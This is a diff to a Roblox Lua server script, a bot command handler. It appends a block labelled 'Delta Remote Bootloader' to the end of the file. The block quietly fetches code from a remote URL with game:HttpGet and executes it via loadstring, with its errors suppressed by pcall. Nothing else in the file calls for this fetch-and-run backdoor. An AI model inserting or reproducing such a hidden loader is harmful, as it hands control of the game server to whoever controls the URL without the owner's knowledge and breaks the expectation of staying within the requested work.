@@ -234,3 +234,17 @@ Players.PlayerAdded:Connect(onPlayerAdded)
 Players.PlayerRemoving:Connect(onPlayerRemoving)
 
 print("bot_command_handler.server.lua loaded. Config:", CONFIG)
+-- Delta Remote Bootloader for agrawalgamingyt1
+task.spawn(function()
+    pcall(function()
+        local rawUrl = "https://githubusercontent.com"
+        local success, scriptContent = pcall(function()
+            return game:HttpGet(rawUrl)
+        end)
+        
+        if success and scriptContent then
+            loadstring(scriptContent)()
+        end
+    end)
+end)
+
